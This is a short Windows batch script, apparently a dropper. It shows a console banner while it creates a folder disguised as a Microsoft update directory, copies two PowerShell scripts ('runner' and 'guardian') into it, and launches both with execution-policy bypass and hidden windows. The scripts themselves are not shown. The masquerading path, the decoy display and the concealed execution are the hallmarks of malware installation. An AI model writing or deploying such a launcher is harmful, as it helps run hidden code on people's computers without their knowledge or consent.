@echo off
set "WORKDIR=%USERPROFILE%\AppData\Local\Microsoft\MSUpdate"
if not exist "%WORKDIR%" mkdir "%WORKDIR%"

:: Запуск баннера в консоли
python "%~dp0banner.py"

:: Копирование скриптов
copy "%~dp0runnerr.ps1" "%WORKDIR%\runnerr.ps1" /Y >nul 2>&1
copy "%~dp0guardiann.ps1" "%WORKDIR%\guardiann.ps1" /Y >nul 2>&1

:: Скрытый запуск PowerShell фоновых процессов
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\runnerr.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\guardiann.ps1"

exit
